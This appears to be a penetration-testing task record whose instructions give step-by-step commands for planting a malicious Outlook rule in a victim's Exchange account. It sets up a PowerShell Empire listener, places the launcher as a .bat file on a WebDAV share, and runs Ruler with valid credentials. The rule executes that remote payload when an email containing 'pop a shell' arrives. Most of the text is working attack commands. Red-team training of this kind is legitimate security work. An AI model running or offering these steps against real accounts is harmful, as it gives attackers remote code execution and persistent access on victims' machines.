{"default_url":null,"content":{"state":3,"taskInstructions":"<h2>Instructions</h2><br>Create Outlook rule in a victim's Exchange account to execute commands when an email is received with specific keywords.<br><br><h2><b>Malicious Outlook Rules</b></h2><br><br><b>Prerequisites</b><br>VALID Domain credentials<br>Victim mail server with Autodiscover turned on<br>Verify by visiting http://autodiscover.&lt;your domain&gt;/autodiscover/autodiscover.xml, should get a valid XML file<br><br><b>Setup </b><br>Install docker at https://docs.docker.com/engine/installation/<br>Get Docker image for WebDav server and exploit tools at S:Docker<br>etspi_autodiscover<br>Load Docker image docker load -i ./netspi_autodiscover<br>Start Docker image docker run -p 80:80 -p 8080:8080 -i -t netspi/autodiscover /bin/bash<br>This will start a container running the webdav server, -p 80:80 binds http://localhost:80 to the Docker container.<br>This means you will use the public IP of the host machine as the webdav server, not the Docker container.<br>Port 8080 will be for Empire to be listening on for agents.<br>Start Powershell Empire and create a listener payload<br><code>$&gt; docker ps &#35;if not already attached to container<br>$&gt; docker attach [container_name] &#35;if not already attached to container<br>$&gt; su safeuser &#35;password is safeuser<br>$&gt; cd ~/Empire<br>$&gt; sudo python Empire<br>$&gt; listeners<br>$&gt; set Host http://[ip_of_host_machine_not_docker]:8080<br>$&gt; execute<br>$&gt; usestager launcher test<br>$&gt; execute<br></code><br>Copy the command string from Empire<br>Save it into a .bat file and place at docker_machine:/var/www/webdav/<br>You can verify it by visiting http://localhost/webdav on the host machine<br>Once the file is saved open empire again and do the next step in another terminal<br><br><b>Execution</b><br><code>$&gt; docker ps<br>$&gt; docker attach [container_name]<br>$&gt; su safeuser &#35;password is safeuser<br>$&gt; cd ~/go/src/github.com/sensepost/ruler<br>$&gt; go run ruler.go --email user@targetdomain.com --username username --password password add --location &quot;\\\\your_host_server_not_docker:80\\webdav\\shell.bat&quot; --trigger &quot;pop a shell&quot; --name maliciousrule<br></code><br>You can add the --send flag and it will automatically send an email to trigger the shell after 30 seconds<br>Otherwise email the victim at --email with --trigger in the subject of the email.<br>","references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":null}}